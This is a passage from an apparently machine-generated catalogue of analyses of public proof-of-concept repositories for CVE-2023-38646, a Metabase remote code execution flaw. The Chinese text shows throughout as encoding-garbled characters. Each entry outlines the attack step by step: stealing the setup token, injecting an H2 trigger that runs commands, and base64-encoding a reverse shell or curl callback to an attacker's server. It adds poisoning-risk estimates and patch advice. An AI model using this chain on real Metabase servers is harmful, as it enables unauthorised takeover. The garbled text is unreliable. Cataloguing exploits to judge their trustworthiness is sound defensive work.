é€šè¿‡curlå‘½ä»¤å›è¿æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼ŒéªŒè¯æ¼æ´çš„å­˜åœ¨ã€‚è™½ç„¶POCä¸­ä½¿ç”¨äº†curlè¿›è¡Œå›è¿ï¼Œä½†æ”»å‡»è€…å¯ä»¥æ›¿æ¢æˆä»»ä½•å‘½ä»¤è¿›è¡Œæ¶æ„åˆ©ç”¨ã€‚æŠ•æ¯’é£é™©è¾ƒä½ï¼Œåªæœ‰æå°çš„å¯èƒ½æ€§ä½œè€…åœ¨ä»£ç ä¸­æ¤å…¥å…¶ä»–æ¶æ„ä»£ç ï¼ˆæ¯”å¦‚åœ¨LICENSEæ–‡ä»¶ä¸­éšè—ä¸å¯è§å­—ç¬¦ï¼‰ï¼Œä½†è¿™å¯ä»¥é€šè¿‡ä»”ç»†å®¡æŸ¥ä»£ç æ¥é¿å…ã€‚PoCä»£ç ä¸»è¦é€šè¿‡H2æ•°æ®åº“çš„ç‰¹æ€§æ‰§è¡Œä»»æ„ä»£ç ï¼ŒLICENSEæ–‡ä»¶ä¸»è¦å£°æ˜äº†ç‰ˆæƒåè®®ã€‚

**é¡¹ç›®åœ°å€:** [kh4sh3i/CVE-2023-38646](https://github.com/kh4sh3i/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #23

**æ¥æº**: [CVE-2023-38646-nickswink_CVE-2023-38646.md](../2023/CVE-2023-38646-nickswink_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç½‘ç»œå¯è¾¾

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´å½±å“ Metabase å¼€æºç‰ˆæœ¬ä½äº 0.46.6.1 å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ä½äº 1.46.6.1 çš„å®ä¾‹ã€‚å¤šä¸ªèµ„æºç¡®è®¤äº†è¯¥æ¼æ´çš„å­˜åœ¨å’Œä¸¥é‡æ€§ã€‚

æä¾›çš„ PoC ä»£ç  `exploit.py` å°è¯•åˆ©ç”¨æ­¤æ¼æ´ã€‚å®ƒé¦–å…ˆè·å– Metabase å®ä¾‹çš„ `setup-token`ï¼Œç„¶åæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚è¯¥è¿æ¥å­—ç¬¦ä¸²åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨è¿æ¥æ—¶æ‰§è¡Œä»»æ„ Java ä»£ç ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚Payloadä½¿ç”¨base64ç¼–ç åå¼¹shellå‘½ä»¤ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Tokenï¼š**  PoC è„šæœ¬é¦–å…ˆå‘ç›®æ ‡ Metabase å®ä¾‹çš„ `/api/session/properties` ç«¯ç‚¹å‘é€ GET è¯·æ±‚ï¼Œè§£æè¿”å›çš„ JSON æ•°æ®ä»¥æå– `setup-token`ã€‚æ­¤ token ç”¨äºåç»­çš„æ¼æ´åˆ©ç”¨ã€‚
2.  **æ„é€ æ¶æ„ Payloadï¼š**  è¯¥è„šæœ¬æ„é€ ä¸€ä¸ª JSON payloadï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªæ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¯¥å­—ç¬¦ä¸²åˆ©ç”¨ `TRACE_LEVEL_SYSTEM_OUT=1` å’Œ `CREATE TRIGGER` ç­‰ H2 ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥æ—¶æ‰§è¡Œä»»æ„ Java ä»£ç ã€‚
3.  **å‘é€ Payloadï¼š**  è„šæœ¬å°†æ„é€ å¥½çš„ payload å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ï¼Œè§¦å‘æ¼æ´ã€‚æˆåŠŸåˆ©ç”¨åï¼ŒæœåŠ¡å™¨å°†æ‰§è¡Œ payload ä¸­çš„å‘½ä»¤ï¼Œåå¼¹ shell åˆ°æ”»å‡»è€…çš„æœºå™¨ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

PoC ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œå¹¶æ— æ˜æ˜¾çš„æ¶æ„æŠ•æ¯’ä»£ç ï¼Œä½†æ˜¯ä»å­˜åœ¨ä¸€å®šçš„é£é™©, å› ä¸ºPoC æœ€ç»ˆç›®çš„æ˜¯æ‰§è¡Œä»»æ„ä»£ç ï¼Œæ”»å‡»è€…å¯ä»¥æ›¿æ¢åå¼¹shellçš„payloadä¸ºæ¶æ„payload,ä¾‹å¦‚åˆ é™¤æœåŠ¡å™¨æ•°æ®ï¼Œå› æ­¤æŠ•æ¯’é£é™©å­˜åœ¨ï¼Œé¢„ä¼°æ¯”ä¾‹ä¸º5%ã€‚æ­¤è¯„ä¼°åŸºäºä»£ç æœ¬èº«ï¼Œä¸åŒ…æ‹¬ä»£ç æ‰˜ç®¡å¹³å°å¯èƒ½å­˜åœ¨çš„é£é™©ï¼Œå¦‚è´¦å·è¢«ç›—ç­‰ã€‚

**é¡¹ç›®åœ°å€:** [nickswink/CVE-2023-38646](https://github.com/nickswink/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #24

**æ¥æº**: [CVE-2023-38646-passwa11_CVE-2023-38646.md](../2023/CVE-2023-38646-passwa11_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªæˆæƒçš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1, < 1.46.6.1 (åŠå…¶ä»–ä¿®å¤ç‰ˆæœ¬è§æ¼æ´åº“ä¿¡æ¯)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´å­˜åœ¨äº Metabase å¼€æºç‰ˆæœ¬ 0.46.6.1 ä¹‹å‰å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ 1.46.6.1 ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ã€‚ä¿®å¤ç‰ˆæœ¬åŒ…æ‹¬ 0.45.4.1, 1.45.4.1, 0.44.7.1, 1.44.7.1, 0.43.7.2, å’Œ 1.43.7.2ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Tokenï¼š** æ”»å‡»è€…é¦–å…ˆé€šè¿‡è®¿é—® `/api/session/properties` ç«¯ç‚¹è·å– setup-tokenã€‚
2.  **æ„é€ æ¶æ„ Payloadï¼š** æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„å‘½ä»¤çš„ JSON payloadã€‚è¯¥ payload åˆ©ç”¨ H2 æ•°æ®åº“çš„ä¸€ä¸ªç‰¹æ€§ï¼Œé€šè¿‡åˆ›å»ºè§¦å‘å™¨åœ¨æŸ¥è¯¢ `INFORMATION_SCHEMA.TABLES` æ—¶æ‰§è¡Œ JavaScript ä»£ç ã€‚è¯¥ JavaScript ä»£ç ä¼šæ‰§è¡Œ bash å‘½ä»¤ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
3.  **å‘é€ Payloadï¼š** æ”»å‡»è€…å°†æ„é€ çš„ payload å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ã€‚åˆ©ç”¨ä»£ç ä¸­ä½¿ç”¨äº†base64ç¼–ç ï¼Œç»•è¿‡æ£€æµ‹ã€‚

**POC ä»£ç æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„ POC ä»£ç ä¼¼ä¹æœ‰æ•ˆï¼Œå› ä¸ºå®ƒå®ç°äº†ä¸Šè¿°åˆ©ç”¨è¿‡ç¨‹ã€‚å®ƒé¦–å…ˆè·å– setup tokenï¼Œç„¶ååˆ›å»ºä¸€ä¸ªåŒ…å«åå‘ shell å‘½ä»¤çš„ payloadï¼Œå¹¶å°†å…¶å‘é€åˆ°ç›®æ ‡ Metabase å®ä¾‹ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è¯¥å­˜å‚¨åº“çš„ä¸»è¦ä»£ç æ–‡ä»¶æ˜¯ `exploit.py`ã€‚ä»”ç»†æ£€æŸ¥æ­¤æ–‡ä»¶ï¼Œæ²¡æœ‰å‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç æˆ–åé—¨ã€‚è¯¥è„šæœ¬çš„åŠŸèƒ½æ˜¯åˆ©ç”¨ CVE-2023-38646 æ¼æ´ï¼Œå…è®¸è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ ä½†æ˜¯ç”±äºè¯¥æ¼æ´æœ¬èº«å°±å¯ä»¥æ‰§è¡Œæ¶æ„ä»£ç ï¼Œä½œè€…å¦‚æœå°†åå¼¹shellçš„IPæˆ–è€…ç«¯å£å†™æ­»ï¼Œå°±æœ‰å¯èƒ½è¢«ä½œè€…æ§åˆ¶ã€‚
`README.md` æ–‡ä»¶ä»…åŒ…å«æœ‰å…³æ¼æ´å’Œä½¿ç”¨è„šæœ¬çš„è¯´æ˜ã€‚å®ƒè¿˜åŒ…å«å¯¹åŸå§‹æ¼æ´å‘ç°å’Œç›¸å…³æ¼æ´åˆ©ç”¨çš„ credit é“¾æ¥ï¼Œè¿™è¡¨æ˜ä½œè€…æ²¡æœ‰è¯•å›¾éšè—è„šæœ¬çš„ç›®çš„ã€‚ç»¼åˆè€ƒè™‘ï¼ŒæŠ•æ¯’çš„æ¦‚ç‡è¾ƒä½ï¼Œå¤§çº¦ä¸º 10%ã€‚

**é¡¹ç›®åœ°å€:** [passwa11/CVE-2023-38646](https://github.com/passwa11/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #25

**æ¥æº**: [CVE-2023-38646-securezeron_CVE-2023-38646.md](../2023/CVE-2023-38646-securezeron_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªæˆæƒè¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯è®¿é—®ï¼Œä¸”ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´å­˜åœ¨äºMetabaseçš„setupæµç¨‹ä¸­ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Token:** ç¬¬ä¸€ä¸ªPOCè„šæœ¬ï¼ˆ`CVE-2023-38646-POC.py`ï¼‰ç”¨äºè·å–Metabaseå®ä¾‹çš„Setup Tokenã€‚å®ƒå°è¯•é€šè¿‡HTTPå’ŒHTTPSè¿æ¥åˆ°ç›®æ ‡IPåœ°å€ï¼Œå¹¶è¯·æ±‚`/api/session/properties`ç«¯ç‚¹ï¼Œè§£æè¿”å›çš„JSONæ•°æ®ï¼Œä»ä¸­æå–`setup-token`ã€‚
2.  **åˆ©ç”¨Setup Tokenæ‰§è¡Œå‘½ä»¤ï¼š** ç¬¬äºŒä¸ªPOCè„šæœ¬ï¼ˆ`CVE-2023-38646-Reverse-Shell.py`ï¼‰åˆ©ç”¨è·å–åˆ°çš„Setup Tokenï¼Œå‘`/api/setup/validate`ç«¯ç‚¹å‘é€POSTè¯·æ±‚ï¼Œå…¶ä¸­åŒ…å«æ¶æ„çš„æ•°æ®åº“è¿æ¥é…ç½®ã€‚è¯¥é…ç½®ä½¿ç”¨H2æ•°æ®åº“å¼•æ“ï¼Œå¹¶åœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­æ³¨å…¥æ¶æ„ä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ªè§¦å‘å™¨`pwnshell`ï¼Œè¯¥è§¦å‘å™¨åœ¨`INFORMATION_SCHEMA.TABLES`è¡¨ä¸Šæ‰§è¡Œ`SELECT`æ“ä½œä¹‹å‰è§¦å‘ï¼Œä»è€Œæ‰§è¡ŒBase64ç¼–ç çš„payloadï¼Œpayloadè§£ç åæ‰§è¡Œåå‘shellå‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**

ä»æä¾›çš„æ¼æ´ä¿¡æ¯ã€æœç´¢ç»“æœå’ŒPOCä»£ç æ¥çœ‹ï¼Œè¯¥æ¼æ´åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚æœç´¢ç»“æœä¸­åŒ…å«äº†å¤šä¸ªå…³äºæ­¤æ¼æ´çš„æè¿°ã€åˆ©ç”¨æ–¹æ³•ä»¥åŠPOCä»£ç çš„é“¾æ¥ã€‚

**æŠ•æ¯’é£é™©ï¼š**

*   ç¬¬ä¸€ä¸ªè„šæœ¬`CVE-2023-38646-POC.py`åªæ˜¯ç”¨æ¥è·å–setup tokenï¼Œæœ¬èº«ä¸åŒ…å«ä»»ä½•æ¶æ„ä»£ç ã€‚
*   ç¬¬äºŒä¸ªè„šæœ¬`CVE-2023-38646-Reverse-Shell.py`åŒ…å«åå‘shellçš„payloadï¼Œè¿™éƒ¨åˆ†æ˜¯æ¼æ´åˆ©ç”¨çš„å¿…è¦ç»„æˆï¼Œä¸èƒ½ç®—ä½œæŠ•æ¯’ä»£ç ã€‚å¯èƒ½çš„æŠ•æ¯’é£é™©åœ¨äºï¼š
    *   **Payloadæ¤å…¥å…¶ä»–æ¶æ„è¡Œä¸ºï¼š** è™½ç„¶å½“å‰Payloadæ˜¯åå‘shellï¼Œä½†æ”»å‡»è€…å¯èƒ½ä¿®æ”¹Payloadï¼Œæ¤å…¥å…¶ä»–æ¶æ„è¡Œä¸ºï¼Œæ¯”å¦‚æ•°æ®çªƒå–ã€å‹’ç´¢è½¯ä»¶ç­‰ã€‚
    *   **ä¾èµ–é¡¹é£é™©ï¼š** è„šæœ¬ä¾èµ–requestsåº“ï¼Œå¦‚æœrequestsåº“æœ¬èº«è¢«æŠ•æ¯’ï¼Œå¯èƒ½å¼•å…¥å®‰å…¨é£é™©ã€‚

ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚è¿™ä¸ª10%ä¸»è¦æ¥è‡ªè„šæœ¬æœ¬èº«ï¼Œæ¯”å¦‚åå‘shell çš„IPåœ°å€ã€ç«¯å£è¢«æ›¿æ¢æˆæ”»å‡»è€…æ§åˆ¶çš„è‚‰é¸¡ä»è€Œè¿›è¡Œè·³æ¿æ”»å‡»ï¼Œä»¥åŠå®‰è£…æ¶æ„ä¾èµ–é¡¹çš„å¯èƒ½ã€‚

æ€»ä¹‹ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ–¹å¼æ˜¯åˆ©ç”¨æœªæˆæƒçš„setupæ¥å£ï¼Œé€šè¿‡æ³¨å…¥æ¶æ„çš„æ•°æ®åº“è¿æ¥é…ç½®æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**é¡¹ç›®åœ°å€:** [securezeron/CVE-2023-38646](https://github.com/securezeron/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #26

**æ¥æº**: [CVE-2023-38646-threatHNTR_CVE-2023-38646.md](../2023/CVE-2023-38646-threatHNTR_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªæ‰“è¡¥ä¸ä¸”ç½‘ç»œå¯è¾¾ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå¯ä»¥å¾—å‡ºä»¥ä¸‹ç»“è®ºï¼š

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„ PoC ä»£ç çœ‹èµ·æ¥æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒåˆ©ç”¨äº† Metabase å®‰è£…è®¾ç½®è¿‡ç¨‹ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œå³åœ¨è®¾ç½®è¿‡ç¨‹ä¸­å¯ä»¥æŒ‡å®šæ•°æ®åº“è¿æ¥ï¼Œå¹¶ä¸”æœªå¯¹æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²è¿›è¡Œå……åˆ†çš„éªŒè¯ã€‚é€šè¿‡æ„é€ æ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œå¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

*   è¯¥PoCé¦–å…ˆè·å– `setup-token` å’Œ Metabase ç‰ˆæœ¬ä¿¡æ¯ã€‚
*   ç„¶åï¼Œå¯¹åŒ…å«åå‘shellå‘½ä»¤çš„payloadè¿›è¡Œbase64ç¼–ç ã€‚
*   æ¥ç€ï¼Œå®ƒæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„JSON payloadï¼Œè¯¥å­—ç¬¦ä¸²åˆ©ç”¨äº†`CREATE TRIGGER` è¯­å¥å’Œå†…åµŒçš„JavaScriptä»£ç æ¥æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚
*   æœ€åï¼Œå®ƒå°†æ­¤payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ï¼Œè§¦å‘å‘½ä»¤æ‰§è¡Œï¼Œåå¼¹shellåˆ°æ”»å‡»è€…æ§åˆ¶çš„IPåœ°å€å’Œç«¯å£ã€‚

å‚è€ƒæœç´¢ç»“æœ [7] æä¾›äº† GitHub é“¾æ¥ï¼Œè¿›ä¸€æ­¥è¯å®äº† PoC çš„å­˜åœ¨ã€‚

**æŠ•æ¯’é£é™©ï¼š**

è™½ç„¶PoCæœ¬èº«çš„ç›®çš„æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†å­˜åœ¨ä¸€å®šç¨‹åº¦çš„æŠ•æ¯’é£é™©ã€‚PoCä»£ç ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥è‡ªå®šä¹‰åå¼¹shellçš„IPåœ°å€å’Œç«¯å£ã€‚å¦‚æœæ”»å‡»è€…æ¶æ„ä¿®æ”¹PoCä»£ç ï¼Œä¾‹å¦‚æ·»åŠ é¢å¤–çš„åé—¨æˆ–æ¶æ„åŠŸèƒ½ï¼Œå¹¶å°†å…¶ä¼ æ’­ç»™å…¶ä»–ç”¨æˆ·ï¼Œåˆ™å¯èƒ½å¯¼è‡´æ›´å¤§èŒƒå›´çš„æ”»å‡»ã€‚é£é™©ä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

*   **ä¾èµ–ç¬¬ä¸‰æ–¹åº“:** æ£€æŸ¥ PoC ä»£ç ä¾èµ–çš„ç¬¬ä¸‰æ–¹åº“æ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚
*   **Payloadä¿®æ”¹:** ç”¨æˆ·å¯èƒ½ç›´æ¥ä½¿ç”¨ PoC ä»£ç ï¼Œè€Œä¸æ£€æŸ¥å…¶å†…å®¹ã€‚æ”»å‡»è€…å¯èƒ½ä¿®æ”¹ payloadï¼Œä¾‹å¦‚æ¤å…¥æŒ–çŸ¿ç¨‹åºæˆ–è€…å…¶ä»–æ¶æ„è½¯ä»¶ã€‚
*   **ç¤¾åŒºä¼ æ’­:** ä¿®æ”¹åçš„ PoC ä»£ç å¯èƒ½åœ¨å®‰å…¨ç¤¾åŒºä¸­ä¼ æ’­ï¼Œå¯¼è‡´æ›´å¤šç”¨æˆ·å—åˆ°å½±å“ã€‚

ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©å¤§çº¦ä¸º 10%ã€‚è¿™ä¸ªç™¾åˆ†æ¯”å¹¶ä¸é«˜ï¼Œå› ä¸ºå¤§å¤šæ•°å®‰å…¨ç ”ç©¶äººå‘˜ä¼šæ£€æŸ¥ä»£ç åå†ä½¿ç”¨ï¼Œä½†ä»ç„¶éœ€è¦è­¦æƒ•ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Token:**  åˆ©ç”¨ `/api/session/properties` ç«¯ç‚¹è·å– Metabase å®ä¾‹çš„ setup tokenã€‚
2.  **æ„é€ æ¶æ„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²:**  åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚è¯¥å­—ç¬¦ä¸²åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡`CREATE TRIGGER`æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
3.  **å‘é€è¯·æ±‚:**  å°†æ„é€ çš„ JSON payload å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ã€‚
4.  **åå¼¹Shell:**  å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼Œç›®æ ‡ Metabase æœåŠ¡å™¨å°†åå¼¹ shell åˆ°æ”»å‡»è€…æŒ‡å®šçš„ IP åœ°å€å’Œç«¯å£ã€‚
5.  **åˆ©ç”¨æœç´¢ç»“æœ** æœç´¢ç»“æœä¸­æåŠè¯¥æ¼æ´å¯èƒ½è¢«åˆ©ç”¨ (Web Attack: Metabase RCE Vulnerability CVE-2023-38646)ï¼Œå¹¶æä¾›äº†ç¼“è§£æªæ–½ï¼Œè¡¨æ˜è¯¥æ¼æ´åœ¨é‡å¤–å¯èƒ½è¢«åˆ©ç”¨ã€‚

**ç¼“è§£æªæ–½ï¼š**

*   å°† Metabase å‡çº§åˆ°å—å½±å“ç‰ˆæœ¬ä»¥å¤–çš„ç‰ˆæœ¬ (>= 0.46.6.1 æˆ– >= 1.46.6.1)æˆ–å…¶ä»–ä¿®å¤ç‰ˆæœ¬ (0.45.4.1, 1.45.4.1, 0.44.7.1, 1.44.7.1, 0.43.7.2, å’Œ 1.43.7.2)ã€‚


**é¡¹ç›®åœ°å€:** [threatHNTR/CVE-2023-38646](https://github.com/threatHNTR/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #27

**æ¥æº**: [CVE-2023-38646-yxl2001_CVE-2023-38646.md](../2023/CVE-2023-38646-yxl2001_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€è®¤è¯å³å¯è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 and < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** MetabaseæœåŠ¡å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´å­˜åœ¨äº Metabase å¼€æºç‰ˆæœ¬ 0.46.6.1 ä¹‹å‰å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ 1.46.6.1 ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Token:** é¦–å…ˆï¼Œåˆ©ç”¨`CVE-2023-38646-POC.py`è„šæœ¬ï¼Œé€šè¿‡è®¿é—®`/api/session/properties`æ¥å£æ¥è·å– Metabase å®ä¾‹çš„ `setup-token`ã€‚æ­¤æ­¥éª¤ç”¨äºåˆ¤æ–­ç›®æ ‡æ˜¯å¦å­˜åœ¨æ¼æ´ï¼Œä»¥åŠè·å–åç»­åˆ©ç”¨æ‰€éœ€çš„tokenã€‚
2.  **æ„é€ æ¶æ„è¯·æ±‚:**  ä½¿ç”¨`CVE-2023-38646-Reverse-Shell.py`è„šæœ¬ï¼Œè¯¥è„šæœ¬åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­åµŒå…¥æ¶æ„ä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ªè§¦å‘å™¨ `pwnshell`ï¼Œè¯¥è§¦å‘å™¨åœ¨è®¿é—® `INFORMATION_SCHEMA.TABLES` è¡¨ä¹‹å‰æ‰§è¡Œï¼Œä»è€Œè§¦å‘ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è„šæœ¬å°†åå¼¹shellçš„bashå‘½ä»¤è¿›è¡Œbase64ç¼–ç ï¼Œç„¶åå°†å…¶æ³¨å…¥åˆ°è§¦å‘å™¨ä¸­ã€‚
3.  **å‘é€ POST è¯·æ±‚:** å°†æ„é€ å¥½çš„åŒ…å«æ¶æ„ä»£ç çš„ JSON æ•°æ®é€šè¿‡ POST è¯·æ±‚å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚æ­¤è¯·æ±‚ä½¿ç”¨è·å–çš„ `setup-token` è¿›è¡ŒéªŒè¯ï¼Œå¹¶è§¦å‘ H2 æ•°æ®åº“è¿æ¥ï¼Œä»è€Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**

